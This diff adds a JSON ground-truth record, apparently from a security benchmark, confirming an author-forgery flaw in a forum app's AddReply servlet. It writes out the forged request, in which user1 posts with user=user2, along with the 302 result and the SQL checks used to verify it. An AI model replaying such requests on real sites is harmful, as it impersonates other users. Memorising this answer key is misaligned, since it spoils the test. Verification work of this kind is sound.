@@ -1,0 +1,34 @@
+{
+  "gt_id": "GT-042",
+  "app": "jsforum",
+  "verified_at": "2026-09-06T09:13:38.104867+00:00",
+  "verdict": "vulnerable",
+  "summary": "user1 POST servlet/forum.AddReply with the user parameter set to user2 returned 302; the created content carries user2 as its author although the session belongs to user1 (author_forged=True).",
+  "sql_statements": [
+    {
+      "kind": "scalar",
+      "sql": "SELECT COALESCE(MAX(reply_id), 0) FROM forum_message WHERE forum_id=7 AND thread_id=21"
+    },
+    {
+      "kind": "query",
+      "sql": "SELECT user FROM forum_message WHERE message='DRHLGT_reply_forge_8686017023' LIMIT 1"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "token": "DRHLGT_reply_forge_8686017023",
+      "attacker_session_user": "user1",
+      "forged_author_param": "user2"
+    },
+    {
+      "kind": "replay",
+      "role": "user1 (logged-in session)",
+      "request": "POST servlet/forum.AddReply user=user2 message=DRHLGT_reply_forge_8686017023",
+      "status_code": 302,
+      "row_created": true,
+      "row_author": "user2",
+      "author_forged_to_user2": true
+    }
+  ]
+}
